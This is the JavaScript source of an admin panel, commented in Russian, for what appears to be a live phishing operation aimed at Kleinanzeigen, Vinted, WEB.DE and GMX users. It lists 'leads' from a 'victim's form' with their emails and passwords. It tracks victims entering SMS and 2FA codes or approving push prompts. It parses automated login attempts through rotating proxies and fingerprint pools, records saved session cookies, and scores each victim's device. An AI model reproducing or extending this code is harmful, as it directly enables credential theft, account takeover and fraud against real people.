/** GMW Admin — logic for admin.html (admin panel). */
(function () {
  'use strict';

  var ADMIN_INIT_GUARD_KEY = '__gmwAdminInitBound_v1';
  var ADMIN_BUTTONS_INIT_GUARD_KEY = '__gmwAdminButtonsInitBound_v1';
  var ADMIN_CONFIG_MODAL_INIT_GUARD_KEY = '__gmwAdminConfigModalInitBound_v1';
  var ADMIN_KLEIN_FORGOT_MODAL_INIT_GUARD_KEY = '__gmwAdminKleinForgotModalInitBound_v1';
  var ADMIN_KLEIN_SMS_WAIT_MODAL_INIT_GUARD_KEY = '__gmwAdminKleinSmsWaitModalInitBound_v1';
  var adminCoreApi = window.AdminCoreApi || {};
  var adminCoreUtils = window.AdminCoreUtils || {};
  var adminLeadDetail = window.AdminLeadDetail || {};
  var authFetch = typeof adminCoreApi.authFetch === 'function'
    ? adminCoreApi.authFetch
    : function (url, options) {
      options = options || {};
      options.headers = options.headers || {};
      if (!options.credentials) options.credentials = 'same-origin';
      return fetch(url, options).then(function (response) {
        if (response && (response.status === 401 || response.status === 403)) {
          window.location.href = '/admin-login';
        }
        return response;
      });
    };
  var escapeHtml = typeof adminCoreUtils.escapeHtml === 'function'
    ? adminCoreUtils.escapeHtml
    : function (s) {
      if (s == null) return '';
      var div = document.createElement('div');
      div.textContent = s;
      return div.innerHTML;
    };

  /** Заглушка под отладку вёрстки (раньше вызывалась без определения → ReferenceError в rAF после loadLeads). */
  function logLayoutHeights() {}

  /** clientFormBrand с формы жертвы (klein / vint / webde / gmx). */
  function humanClientFormBrand(b) {
    var x = (b || '').toLowerCase();
    if (x === 'klein') return 'Kleinanzeigen';
    if (x === 'vint') return 'Vint';
    if (x === 'webde') return 'WEB.DE';
    if (x === 'gmx') return 'GMX';
    return '';
  }

  function getLeadAltEmailValue(lead) {
    if (!lead) return '';
    var emailVt = String(lead.emailVt || '').trim();
    var emailKl = String(lead.emailKl || '').trim();
    var brand = String(lead.brand || '').toLowerCase();
    if (brand === 'vint') return emailVt || emailKl;
    if (brand === 'klein') return emailKl || emailVt;
    return emailKl || emailVt;
  }

  function getLeadAltPasswordValue(lead) {
    if (!lead) return '';
    var passwordVt = String(lead.passwordVt || '').trim();
    var passwordKl = String(lead.passwordKl || '').trim();
    var brand = String(lead.brand || '').toLowerCase();
    if (brand === 'vint') return passwordVt || passwordKl;
    if (brand === 'klein') return passwordKl || passwordVt;
    return passwordKl || passwordVt;
  }

  function getLeadDisplayEmail(lead) {
    if (!lead) return '';
    var main = String(lead.email || '').trim();
    return main || getLeadAltEmailValue(lead);
  }

  function getLeadDisplayPassword(lead) {
    if (!lead) return '';
    var main = String(lead.password || '').trim();
    return main || getLeadAltPasswordValue(lead);
  }

  var normalizeUiBrand = typeof adminCoreUtils.normalizeUiBrand === 'function'
    ? adminCoreUtils.normalizeUiBrand
    : function (brand) {
      var b = String(brand || '').toLowerCase();
      if (b === 'klein' || b === 'vint' || b === 'webde' || b === 'gmx') return b;
      return '';
    };
  var normalizeLeadId = typeof adminCoreUtils.normalizeLeadId === 'function'
    ? adminCoreUtils.normalizeLeadId
    : function (id) {
      if (id == null || id === '') return null;
      return String(id);
    };
  var leadIdsEqual = typeof adminCoreUtils.leadIdsEqual === 'function'
    ? adminCoreUtils.leadIdsEqual
    : function (a, b) {
      if (a == null || b == null) return false;
      return String(a) === String(b);
    };

  function getBrandLabelSetByBrand(brand) {
    var b = normalizeUiBrand(brand);
    var isKlein = b === 'klein';
    var isVint = b === 'vint';
    return {
      brand: b,
      isKlein: isKlein,
      isVint: isVint,
      suffix: isKlein ? ' KL' : (isVint ? ' VT' : ''),
      primaryEmail: 'EMAIL',
      primaryPassword: 'PASSWORD',
      altEmail: isVint ? 'Email VT' : 'Email KL',
      altPassword: isVint ? 'Password VT' : 'Password KL',
      altEmailUpper: isVint ? 'EMAIL VT' : 'EMAIL KL',
      altPasswordUpper: isVint ? 'PASSWORD VT' : 'PASSWORD KL',
      sms: isVint ? 'SMS VT' : (isKlein ? 'SMS KL' : 'SMS'),
      success: isKlein ? 'Успех KL' : (isVint ? 'Успех VT' : 'Успех'),
      wrongPassword: isKlein ? 'Неверный пароль KL' : (isVint ? 'Неверный пароль VT' : 'Неверный пароль'),
      wrongSms: isKlein ? 'Неверный SMS KL' : (isVint ? 'Неверный SMS VT' : 'Неверный SMS'),
      providedSms: isVint ? 'Дал SMS VT' : (isKlein ? 'Дал SMS KL' : 'Дал SMS')
    };
  }

  function getLeadBrandLabelSet(lead) {
    return getBrandLabelSetByBrand(lead && lead.brand);
  }

  function parseAutoLoginAttempt(raw) {
    var s = String(raw || '');
    var m = s.match(/(\d+)\s*\/\s*(\d+)/);
    if (m && m[1] && m[2]) return m[1] + '/' + m[2];
    var m2 = s.match(/попытк[аи]\s*№?\s*(\d+)\s*из\s*(\d+)/i);
    if (m2 && m2[1] && m2[2]) return m2[1] + '/' + m2[2];
    return '';
  }

  function parseAutoLoginMeta(raw) {
    var s = String(raw || '');
    var proxyNum = '';
    var fpNum = '';
    var pm = s.match(/proxy\.txt\s*строка\s*=\s*(\d+)/i);
    if (pm && pm[1]) proxyNum = String(pm[1]);
    var fm = s.match(/fp_pool\s*=\s*(\d+)/i);
    if (fm && fm[1] != null) fpNum = String(Number(fm[1]) + 1);
    return { proxyNum: proxyNum, fpNum: fpNum };
  }

  function detectAutoLoginBrand(raw) {
    var l = String(raw || '').toLowerCase();
    if (l.indexOf('web.de') !== -1 || l.indexOf('webde') !== -1) return 'web.de';
    if (l.indexOf('gmx') !== -1) return 'gmx';
    if (l.indexOf('vint') !== -1) return 'vint';
    if (l.indexOf('klein') !== -1 || l.indexOf(' kl') !== -1) return 'kl';
    return '';
  }

  function errorLabelByBrand(brand) {
    var b = String(brand || '').toLowerCase();
    if (b === 'klein') return 'kl err';
    if (b === 'vint') return 'vt err';
    if (b === 'webde' || b === 'web.de') return 'web err';
    return 'gmx err';
  }

  function isAutoLoginLabelWithMeta(label) {
    return /^Автовход\s+\S+\s+\d+\/\d+\s+\S+\s+\|\s+\S+$/i.test(String(label || ''));
  }

  function autoLoginDedupeKey(label) {
    var s = String(label || '').trim();
    var m = s.match(/^(Автовход\s+\S+\s+\d+\/\d+)/i);
    return m && m[1] ? m[1].toLowerCase() : s.toLowerCase();
  }

  function semanticEventDedupeKey(label) {
    var s = String(label || '').trim().toLowerCase();
    if (!s) return s;
    if (s === 'пуш' || s === 'нужен пуш') return 'push';
    if (s === 'push') return 'push';
    if (s.indexOf('просит push') !== -1) return 'push';
    if (s === 'sms' || s === 'sms kl' || s === 'sms vt') return 'sms';
    if (s.indexOf('просит sms') !== -1) return 'sms';
    if (s === 'просит новый') return 'wants_new';
    if (s === '2fa') return '2fa';
    if (s.indexOf('автовход ') === 0) return autoLoginDedupeKey(label);
    return s;
  }

  /** Приводим технические логи к коротким фразам для блока Events. */
  function compactEventLabel(raw, leadBrand) {
    var txt = String(raw || '').replace(/\s+/g, ' ').trim();
    if (!txt) return null;
    var l = txt.toLowerCase();
    var labels = getBrandLabelSetByBrand(leadBrand);

    if (l.indexOf('сайт → сервер: submit') === 0 || l.indexOf('сайт -> сервер: submit') === 0) return null;
    if (l.indexOf('submit принят') !== -1 || l.indexOf('новая запись') !== -1) return null;
    if (l === 'emailkl' || l === 'email kl' || l === 'email vt') return labels.altEmail;
    if (l === 'passkl' || l === 'pass kl' || l === 'password kl' || l === 'password vt') return labels.altPassword;
    if (l === 'email') return labels.primaryEmail;
    if (l === 'pass' || l === 'password') return labels.primaryPassword;
    if (l === 'ввел пароль повторно - ошибка') return 'Ввел пароль повторно - ошибка';
    if (l.indexOf('ввел пароль повторно') === 0) return txt.length <= 120 ? txt : null;
    if (l.indexOf('ввел почту kl') === 0 || l.indexOf('новый пароль kl') === 0 || l.indexOf('ввел почту vt') === 0 || l.indexOf('новый пароль vt') === 0) return labels.altPassword;
    if (l.indexOf('ввел почту') === 0) return labels.primaryEmail;
    if (l.indexOf('ввел пароль') === 0 || l.indexOf('новый пароль') === 0) return labels.primaryPassword;
    if (l.indexOf('ввел sms kl') === 0 || l.indexOf('ввел sms vt') === 0) return txt.length <= 120 ? txt : null;
    if (l.indexOf('ввел sms-код') === 0 || l.indexOf('ввел sms:') === 0) return txt.length <= 120 ? txt : null;
    if (l.indexOf('ввел 2fa-код') === 0) return txt.length <= 120 ? txt : null;
    if (l === 'sms' || l === 'sms kl' || l === 'sms vt') return labels.sms;
    if (l === '2fa') return '2FA';
    if (l.indexOf('leadid=') !== -1 || l.indexOf('visitid=') !== -1 || l.indexOf(' ip=') !== -1) return null;
    if (l.indexOf('[вход]') !== -1 || l.indexOf('gmx-net.') !== -1) return null;

    if (l.indexOf('куки сохранен') !== -1) return txt.length <= 120 ? txt : null;
    if (l === 'автовход удался' || (l.indexOf('автовход удался') === 0 && l.indexOf('·') === -1)) return 'Автовход удался';

    if (l.indexOf('попытка входа') !== -1) {
      var a2 = parseAutoLoginAttempt(txt);
      var b2 = detectAutoLoginBrand(txt);
      var m2 = parseAutoLoginMeta(txt);
      if (a2) {
        var lb2 = 'Автовход' + (b2 ? ' ' + b2 : '') + ' ' + a2;
        if (m2.proxyNum || m2.fpNum) lb2 += ' ' + (m2.proxyNum || '-') + ' | ' + (m2.fpNum || '-');
        return lb2;
      }
    }

    if (l.indexOf('автовход') !== -1 || l.indexOf('[auto-login]') !== -1 || l.indexOf('[режим]') === 0) {
      if (l.indexOf('пропуск') !== -1) return 'Автовход пропущен';
      if (l.indexOf('успешный вход') !== -1 || l.indexOf('вход удался') !== -1 || l.indexOf('result=success') !== -1) return 'Автовход удался';
      if (/^Автовход\s+(WEB|GMX|Klein)(\s+\d+\/\d+|:|\s)/i.test(txt)) return txt;
      var brand = detectAutoLoginBrand(txt);
      var attempt = parseAutoLoginAttempt(txt);
      if (!attempt) return null;
      var meta = parseAutoLoginMeta(txt);
      var label = 'Автовход' + (brand ? ' ' + brand : '');
      label += ' ' + attempt;
      if (meta.proxyNum || meta.fpNum) {
        label += ' ' + (meta.proxyNum || '-') + ' | ' + (meta.fpNum || '-');
      }
      return label;
    }

    if (l.indexOf('жду пароль') !== -1 || l.indexOf('ждём пароль') !== -1 || l.indexOf('ожидание пароля') !== -1) {
      return 'Ждем пароль';
    }

    if (l.indexOf('нужен пуш') !== -1 || l.indexOf('экране push') !== -1) return 'Нужен пуш';
    if (l === 'push') return 'PUSH';
    if (l === 'просит новый') return 'Просит новый';
    if (l === 'запрос push') return 'Просит новый';
    if (l === 'запрос sms') return labels.sms;
    if (l.indexOf('push') !== -1) return 'PUSH';

    if (l.indexOf('2fa') !== -1) {
      if (l.indexOf('erneut') !== -1 || l.indexOf('переотправ') !== -1) return 'Просит новый';
      if (l.indexOf('неверн') !== -1 || l.indexOf('таймаут') !== -1) return 'Ошибка 2FA';
      return '2FA';
    }
    if (l.indexOf('sms') !== -1) {
      if (l.indexOf('неверн') !== -1 || l.indexOf('ошибка') !== -1) return 'Ошибка ' + labels.sms;
      return labels.sms;
    }

    if (l.indexOf('исключение при входе') !== -1 || l.indexOf('logintemporarilyunavailable') !== -1 || l.indexOf('поле пароля не появилось') !== -1 || l.indexOf('не удалось войти') !== -1) {
      var errBrand = detectAutoLoginBrand(txt) || 'gmx';
      return 'Ошибка входа (' + errBrand + ')';
    }
    if (l.indexOf('успешный вход') !== -1 || l.indexOf('вход удался') !== -1 || l.indexOf('result=success') !== -1) return 'Автовход удался';
    if (l.indexOf('неверный пароль') !== -1 || l.indexOf('error password') !== -1) return 'Ошибка пароля';
    if (l.indexOf('send email') !== -1 || l.indexOf('send e-mail') !== -1 || l.indexOf('почта готова') !== -1) return 'Send E-Mail';
    if (l === 'окно ожидания') return 'Окно ожидания';
    if (l.indexOf('время ожидания вышло') !== -1) return txt.length <= 90 ? txt : null;
    if (l.indexOf('переотправлен push') === 0) return txt.length <= 120 ? txt : null;
    if (l === 'просит push' || l.indexOf('просит push') === 0) return 'PUSH';
    if (l === 'просит sms kl' || (l.indexOf('просит sms') !== -1 && l.indexOf('kl') !== -1)) return labels.sms;
    if (l === 'просит sms' || l.indexOf('просит sms') === 0) return labels.sms;
    if (l === 'почта: готово к письму') return 'Почта: готово к письму';
    if (eventLabelLooksWorked(txt)) return 'Отработан';

    if (txt.length > 90) return null;
    return txt;
  }

  function buildCompactEventsForRender(items, leadBrand) {
    var out = [];
    var i;
    for (i = 0; i < items.length; i++) {
      var src = items[i] || {};
      var shortLabel = compactEventLabel(src.label || '', leadBrand);
      if (!shortLabel) continue;
      var key = semanticEventDedupeKey(shortLabel);
      if (out.length > 0 && out[out.length - 1]._dedupeKey === key) {
        if (!isAutoLoginLabelWithMeta(out[out.length - 1].label) && isAutoLoginLabelWithMeta(shortLabel)) {
          out[out.length - 1].label = shortLabel;
        }
        continue;
      }
      out.push({
        kind: src.kind,
        atMs: src.atMs,
        idx: src.idx,
        at: src.at,
        label: shortLabel,
        detail: String(src.detail || '').trim(),
        _dedupeKey: key
      });
    }
    return out;
  }

  /**
   * Единый UI-Kit для модалок Config / Fingerprint (тёмная панель в admin.css .admin-modal-root).
   * Автовысота monospace-полей без двойного скролла.
   */
  var AdminModalKit = (function () {
    var SELECTOR_CODE = '#config-proxies-text, #config-email-html';
    function maxEditorHeightPx() {
      return Math.floor(window.innerHeight * 0.5);
    }
    function syncOneTextarea(ta) {
      if (!ta || ta.nodeName !== 'TEXTAREA') return;
      ta.style.overflowY = 'hidden';
      ta.style.height = 'auto';
      var maxH = maxEditorHeightPx();
      var next = Math.max(ta.scrollHeight + 2, 72);
      ta.style.height = Math.min(next, maxH) + 'px';
      ta.style.overflowY = next > maxH ? 'auto' : 'hidden';
    }
    function bindAutoGrow(ta) {
      if (!ta || ta.nodeName !== 'TEXTAREA') return;
      if (ta.getAttribute('data-admin-autogrow') === '1') return;
      ta.setAttribute('data-admin-autogrow', '1');
      ta.classList.add('admin-code-editor');
      function onSync() {
        syncOneTextarea(ta);
      }
      ta.addEventListener('input', onSync);
      ta.addEventListener('focus', onSync);
      window.addEventListener('resize', onSync);
      onSync();
    }
    function bindAllCodeEditors() {
      document.querySelectorAll(SELECTOR_CODE).forEach(bindAutoGrow);
    }
    function syncCodeEditorHeights() {
      document.querySelectorAll('.admin-code-editor').forEach(syncOneTextarea);
    }
    return {
      bindAllCodeEditors: bindAllCodeEditors,
      syncCodeEditorHeights: syncCodeEditorHeights,
      /** Вызов при старте админки: классы на корнях уже в разметке; цепляем автовысоту. */
      init: function () {
        bindAllCodeEditors();
      }
    };
  })();

  /** Модалка иконки ОС: общие поля + блоки telemetrySnapshots с разделителями между устройствами. */
  function buildAntiFraudModalText(d) {
    var lines = [];
    lines.push('=== Антифрод: все снимки лида ===');
    lines.push('leadId: ' + (d.leadId || '—'));
    lines.push('brand (запись): ' + (d.brand || '—'));
    lines.push('clientFormBrand (форма): ' + (humanClientFormBrand(d.clientFormBrand) || d.clientFormBrand || '—'));
    lines.push('hostBrandAtSubmit: ' + (d.hostBrandAtSubmit || '—'));
    if (d.email) lines.push('email: ' + d.email);
    if (d.emailKl) lines.push('emailKl: ' + d.emailKl);
    lines.push('platform (в записи): ' + (d.platform || '—'));
    lines.push('userAgent (последний на сервере): ' + (d.userAgent || '—'));
    lines.push('ip (последний): ' + (d.ip || '—'));
    lines.push('screen: ' + (d.screenWidth != null ? d.screenWidth : '—') + ' × ' + (d.screenHeight != null ? d.screenHeight : '—'));
    lines.push('createdAt: ' + (d.createdAt || '—'));
    lines.push('lastSeenAt: ' + (d.lastSeenAt || '—'));
    lines.push('');

    var snaps = Array.isArray(d.telemetrySnapshots) && d.telemetrySnapshots.length > 0
      ? d.telemetrySnapshots
      : [];
    if (snaps.length === 0) {
      snaps = [{
        at: d.lastSeenAt || d.createdAt,
        stableFingerprintSignature: d.stableFingerprintSignature,
        deviceSignature: d.deviceSignature,
        fingerprint: d.fingerprint,
        clientSignals: d.clientSignals,
        requestMeta: d.requestMeta
      }];
    }

    var total = snaps.length;
    var si;
    for (si = 0; si < snaps.length; si++) {
      var s = snaps[si];
      if (total > 1) {
        lines.push('══════════════════════ Устройство / снимок ' + (si + 1) + ' из ' + total + ' ══════════════════════');
        lines.push('');
      }
      lines.push('время снимка: ' + (s.at || '—'));
      lines.push('stableFingerprintSignature: ' + (s.stableFingerprintSignature || '—'));
      lines.push('deviceSignature: ' + (s.deviceSignature || '—'));
      lines.push('');
      if (s.antiFraudAssessment && typeof s.antiFraudAssessment === 'object' && s.antiFraudAssessment.score != null) {
        var a = s.antiFraudAssessment;
        lines.push('--- ОЦЕНКА АНТИФРОДА (100 = лучше) ---');
        lines.push('Балл: ' + a.score + ' / ' + (a.maxScore != null ? a.maxScore : 100));
        lines.push('Уровень: ' + (a.grade || '—') + ' | штраф суммарно: ' + (a.totalPenalty != null ? a.totalPenalty : '—'));
        if (a.summary) lines.push('Итог: ' + a.summary);
        if (Array.isArray(a.flags) && a.flags.length > 0) {
          lines.push('Флаги:');
          var fi;
          for (fi = 0; fi < a.flags.length; fi++) {
            var f = a.flags[fi];
            var sev = f.severity ? '[' + f.severity + '] ' : '';
            var pts = f.points != null ? ' (−' + f.points + ')' : '';
            lines.push('  • ' + sev + (f.code || '') + pts + ' — ' + (f.message || ''));
          }
        } else {
          lines.push('Флаги: нет замечаний по правилам оценки');
        }
        lines.push('');
      } else {
        lines.push('--- ОЦЕНКА АНТИФРОДА: для этого снимка нет (старая запись до внедрения) ---');
        lines.push('');
      }
      if (s.behaviorSignals && typeof s.behaviorSignals === 'object') {
        lines.push('--- behaviorSignals (мышь, тайминги, клавиши без текста) ---');
        try {
          lines.push(JSON.stringify(s.behaviorSignals, null, 2));
        } catch (eB) {
          lines.push(String(s.behaviorSignals));
        }
        lines.push('');
      }
      if (s.fingerprint && typeof s.fingerprint === 'object') {
        lines.push('--- fingerprint (preset + viewport) ---');
        Object.keys(s.fingerprint).forEach(function (k) {
          var v = s.fingerprint[k];
          if (Array.isArray(v)) v = v.join(', ');
          else if (v === undefined || v === null) v = '—';
          lines.push(k + ': ' + v);
        });
        lines.push('');
      }
      if (s.clientSignals && typeof s.clientSignals === 'object') {
        lines.push('--- clientSignals ---');
        try {
          lines.push(JSON.stringify(s.clientSignals, null, 2));
        } catch (e1) {
          lines.push(String(s.clientSignals));
        }
        lines.push('');
      } else {
        lines.push('--- clientSignals: нет в этом снимке ---');
        lines.push('');
      }
      if (s.requestMeta && typeof s.requestMeta === 'object') {
        lines.push('--- requestMeta ---');
        try {
          lines.push(JSON.stringify(s.requestMeta, null, 2));
        } catch (e2) {
          lines.push(String(s.requestMeta));
        }
        lines.push('');
      } else {
        lines.push('--- requestMeta: нет в этом снимке ---');
        lines.push('');
      }
    }
    return lines.join('\n').replace(/\n+$/, '');
  }

  function copyToClipboard(text) {
    var t = (text || '').trim();
    if (!t) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(t).then(function () {
        showCopyFeedback();
      }).catch(function () { fallbackCopy(t); });
    } else {
      fallbackCopy(t);
    }
  }
  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      showCopyFeedback();
    } catch (e) {}
    document.body.removeChild(ta);
  }
  function showCopyFeedback() {
    var toast = document.getElementById('copy-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'copy-toast';
      toast.className = 'copy-toast';
      toast.textContent = 'Copied';
      document.body.appendChild(toast);
    }
    toast.classList.add('visible');
    clearTimeout(toast._tid);
    toast._tid = setTimeout(function () { toast.classList.remove('visible'); }, 1200);
  }

  /** variant: 'error' | 'success' (по умолчанию error — как раньше). */
  function showToast(message, variant) {
    variant = variant || 'error';
    var toast = document.getElementById('msg-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'msg-toast';
      document.body.appendChild(toast);
    }
    toast.textContent = message || (variant === 'success' ? 'Готово' : 'Ошибка');
    toast.className = 'copy-toast';
    if (variant === 'success') toast.classList.add('copy-toast--success');
    else toast.classList.add('copy-toast--error');
    toast.classList.add('visible');
    clearTimeout(toast._tid);
    var ms = variant === 'success' ? 4500 : 3000;
    toast._tid = setTimeout(function () { toast.classList.remove('visible'); }, ms);
  }

  function getLeadUnreadChatCount(lead) {
    if (!lead || typeof lead !== 'object') return 0;
    var n = lead.chatUnreadCount;
    if (typeof n === 'string') n = parseInt(n, 10);
    return Number.isFinite(n) && n > 0 ? n : 0;
  }
  function formatUnreadBadgeCount(n) {
    if (!Number.isFinite(n) || n <= 0) return '';
    return n > 99 ? '99+' : String(n);
  }

  function getLeadChatBrand(lead) {
    var b = lead && lead.brand != null ? String(lead.brand).trim().toLowerCase() : '';
    return (b === 'gmx' || b === 'webde' || b === 'klein') ? b : '';
  }

  function normalizeAdminUiModeValue(mode) {
    var value = String(mode || '').trim().toLowerCase();
    return (value === 'email' || value === 'klein' || value === 'vint') ? value : '';
  }

  function getAdminUiModeFromBody() {
    try {
      return normalizeAdminUiModeValue(
        document && document.body && typeof document.body.getAttribute === 'function'
          ? document.body.getAttribute('data-admin-ui-mode')
          : ''
      );
    } catch (e) {
      return '';
    }
  }

  var leads = [];
  var selectedId = null;
  var selectedIds = {};
  var lastViewedSnapshot = {};
  /** Развёрнут ли блок Events «Показать предыдущие» для лида (ключ — String(id)). */
  var detailEventsPastExpanded = {};
  var firstLoad = true;
  var adminModeLeadsFilter = {
    getMode: function () {
      return getAdminUiModeFromBody() || 'email';
    },
    isLeadVisible: function () { return true; },
    filterLeads: function (list) { return Array.isArray(list) ? list : []; }
  };

  function getSelectedLeadIds() {
    return Object.keys(selectedIds);
  }

  function clearSelectionAfterBulk() {
    selectedIds = {};
  }

  function setAllSelectionOnCurrentPage(nextChecked) {
    var boxes = document.querySelectorAll('.session-check');
    boxes.forEach(function (cb) {
      var id = cb.getAttribute('data-id');
      if (!id) return;
      cb.checked = !!nextChecked;
      if (nextChecked) selectedIds[id] = true;
      else delete selectedIds[id];
    });
  }

  function toggleAllOnCurrentPage() {
    var boxes = document.querySelectorAll('.session-check');
    var total = boxes.length;
    if (total === 0) return;
    var checked = 0;
    boxes.forEach(function (cb) { if (cb.checked) checked++; });
    var next = checked !== total; // если не все выбраны → выбрать все; иначе снять все
    setAllSelectionOnCurrentPage(next);
  }

  function postBulkAction(payload) {
    return postJson('/api/leads-sidebar-bulk', payload);
  }

  function bulkSendEmail(ids) {
    return postJson('/api/send-email-bulk', { ids: ids });
  }
  var pollInterval = null;
  var adminRealtimeWsController = null;
  /** Без фонового опроса лидов, пока вкладка свёрнута — экономим CPU/сеть и главный поток. */
  function pollLeadsIfTabVisible() {
    try {
      if (document.hidden) return;
    } catch (e) {}
    loadLeads();
  }
  var wsLeadsReloadTimer = null;
  var wsLeadsReloadNeedChat = false;
  /** Один раз запрашиваем разрешение на desktop-уведомления Klein, а не на каждый лид. */
  var wsKleinNotifPermissionRequested = false;
  /** Единый WebAudio-контекст для звуков админки (новый лид + логи брендов). */
  var adminAudioCtx = null;
  var adminAudioWarmupBound = false;
  var adminAudioWarmupBusy = false;
  var adminAudioUnlocked = false;
  var adminAudioFallbackCache = {};
  var lastAdminLogSoundKey = '';
  var lastAdminLogSoundAtMs = 0;
  /** Склеиваем шквал WS (log_appended / lead-patch) в одну перерисовку детали — иначе админка «залипает» (~72ms). */
  var adminDetailDebounceTimer = null;
  function flushAdminDetailDebounce() {
    if (adminDetailDebounceTimer) {
      clearTimeout(adminDetailDebounceTimer);
      adminDetailDebounceTimer = null;
    }
  }
  /** @param {boolean} [refetchChat] по умолчанию true; для log_appended — false (чат не меняется, лишний GET /api/chat). */
  function scheduleRenderDetailFromWs(refetchChat) {
    if (adminDetailDebounceTimer) clearTimeout(adminDetailDebounceTimer);
    adminDetailDebounceTimer = setTimeout(function () {
      adminDetailDebounceTimer = null;
      renderDetail();
      if (refetchChat !== false && selectedId) loadAdminChat(true);
    }, 72);
  }

  function isChatTabActive() {
    var tabChat = document.getElementById('tab-chat');
    return !!(tabChat && tabChat.classList.contains('is-active'));
  }

  function leadUpdateTouchesChat(prevLead, nextLead) {
    if (!nextLead || typeof nextLead !== 'object') return false;
    var prevChatCount = prevLead && Number.isFinite(Number(prevLead.chatCount)) ? Number(prevLead.chatCount) : 0;
    var nextChatCount = Number.isFinite(Number(nextLead.chatCount)) ? Number(nextLead.chatCount) : prevChatCount;
    if (nextChatCount !== prevChatCount) return true;
    var prevUnread = prevLead && Number.isFinite(Number(prevLead.chatUnreadCount)) ? Number(prevLead.chatUnreadCount) : 0;
    var nextUnread = Number.isFinite(Number(nextLead.chatUnreadCount)) ? Number(nextLead.chatUnreadCount) : prevUnread;
    return nextUnread !== prevUnread;
  }

  function leadPatchTouchesChat(patch) {
    if (!patch || typeof patch !== 'object') return false;
    return Object.prototype.hasOwnProperty.call(patch, 'chatCount')
      || Object.prototype.hasOwnProperty.call(patch, 'chatUnreadCount');
  }

  var activityBadgeDebounceTimer = null;
  function scheduleActivityBadgeFromWs() {
    if (activityBadgeDebounceTimer) clearTimeout(activityBadgeDebounceTimer);
    activityBadgeDebounceTimer = setTimeout(function () {
      activityBadgeDebounceTimer = null;
      updateActivityBadge(getNewActivityCount(leads));
      updateChatTabNewIndicator();
    }, 48);
  }
  var leadsPage = 1;
  var leadsTotal = 0;
  var leadsLimit = 50;
  var statsPeriod = 'today';
  /** Поиск в списке лидов (GET /api/leads?q=), мин. 2 символа. */
  var leadsSidebarSearchQ = '';
  /** Текст в поле поиска (в т.ч. &lt; 2 символов), чтобы ре-рендер пагинации при poll/WS не затирал ввод. */
  var leadsSidebarSearchDraft = '';
  var leadsSidebarSearchTimer = null;
  /** Отмена предыдущего GET /api/leads — иначе ответы приходят не по порядку (WS / poll) и сбрасывают страницу. */
  var leadsLoadAbort = null;

  var el = {
    countBadge: null,
    leadsList: null,
    leadEmpty: null,
    leadsPagination: null,
    leadsPaginationTop: null,
    detailPlaceholder: null,
    mainContent: null,
    detailEmail: null,
    detailPasswordCurrent: null,
    passwordHistory: null,
    detailTerminal: null,
    sessionsListWrap: null,
    statsContent: null,
    statsGrid: null
  };

  /** Как на сервере eventLabelIsWorkedMark — иначе сайдбар и /api/archive-leads-by-filter расходятся. */
  function eventLabelLooksWorked(lbl) {
    var s = String(lbl != null ? lbl : '').trim().toLowerCase();
    try { s = s.normalize('NFC'); } catch (e) {}
    if (!s) return false;
    if (s === 'отработан') return true;
    if (s.indexOf('отработан') === 0) return true;
    return s.indexOf('отработан') !== -1;
  }

  var EVENT_WORKED_TOGGLE_OFF_LABEL = 'Снята пометка оператором';

  function eventLabelLooksWorkedToggleOff(lbl) {
    var s = String(lbl != null ? lbl : '').trim().toLowerCase();
    try { s = s.normalize('NFC'); } catch (e) {}
    return s === EVENT_WORKED_TOGGLE_OFF_LABEL.toLowerCase();
  }

  /** Список слева: «Отработан» с учётом снятия пометки (с конца лога); Klein в архиве — всегда отработан. */
  function leadIsSidebarWorked(lead) {
    if (!lead) return false;
    if (lead.klLogArchived === true || lead.klLogArchived === 'true') return true;
    var events = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
    for (var i = events.length - 1; i >= 0; i--) {
      var ev = events[i];
      var lbl = ev && (ev.label != null ? ev.label : ev.text);
      if (eventLabelLooksWorkedToggleOff(lbl)) return false;
      if (eventLabelLooksWorked(lbl)) return true;
    }
    return false;
  }

  /** Тип кода в smsCodeData для UI: SMS и 2FA хранятся в одном объекте, различаем по kind или (для старых логов) по status/событиям. */
  function smsCodeDataKind(lead) {
    var d = lead && lead.smsCodeData;
    if (!d || !String(d.code || '').trim()) return null;
    var k = d.kind;
    if (k === '2fa' || k === 'sms') return k;
    var st = String(lead.status || '').toLowerCase();
    if (st === 'redirect_2fa_code') return '2fa';
    if (st === 'redirect_sms_code' || st === 'redirect_sms') return 'sms';
    var evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
    for (var i = evs.length - 1; i >= 0; i--) {
      var lab = String((evs[i] && (evs[i].label != null ? evs[i].label : evs[i].text)) || '').toLowerCase();
      if (lab.indexOf('ввел 2fa-код') === 0) return '2fa';
      if (lab.indexOf('ввел sms kl') === 0 || lab.indexOf('ввел sms-код') === 0 || lab.indexOf('ввел sms:') === 0) return 'sms';
    }
    return 'sms';
  }

  function getBadgeClassAndLabel(lead) {
    if (leadIsSidebarWorked(lead)) {
      return { cls: 'action-worked', label: 'Отработан' };
    }
    var status = (lead.status || 'pending').toLowerCase();
    var labels = getLeadBrandLabelSet(lead);
    var isKlein = labels.isKlein;
    var isVint = labels.isVint;
    var errLabel = errorLabelByBrand(lead && lead.brand);
    var hasPassword = (lead.password || '').trim() !== '';
    var hasPasswordAlt = getLeadAltPasswordValue(lead) !== '';
    var altEmailLabel = labels.altEmail;
    var altPasswordLabel = labels.altPassword;
    var successBrandLabel = labels.success;
    var wrongPasswordBrandLabel = labels.wrongPassword;
    var wrongSmsBrandLabel = labels.wrongSms;
    var providedSmsBrandLabel = labels.providedSms;
    var suf = labels.suffix;
    var events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];

    function fromLastEvent(lbl) {
      if (!lbl) return null;
      if (eventLabelLooksWorkedToggleOff(lbl)) return null;
      var l = lbl.toLowerCase();
      if (l === 'emailkl' || l === 'email vt') return { cls: 'action-email', label: altEmailLabel };
      if (l === 'passkl' || l === 'password vt') return { cls: 'action-password', label: altPasswordLabel };
      if (l === 'email') return { cls: 'action-email', label: labels.primaryEmail };
      if (l === 'pass') return { cls: 'action-password', label: labels.primaryPassword };
      if (l.indexOf('автовход web') === 0 || l.indexOf('автовход gmx') === 0) return { cls: 'action-email', label: 'WEB.DE' };
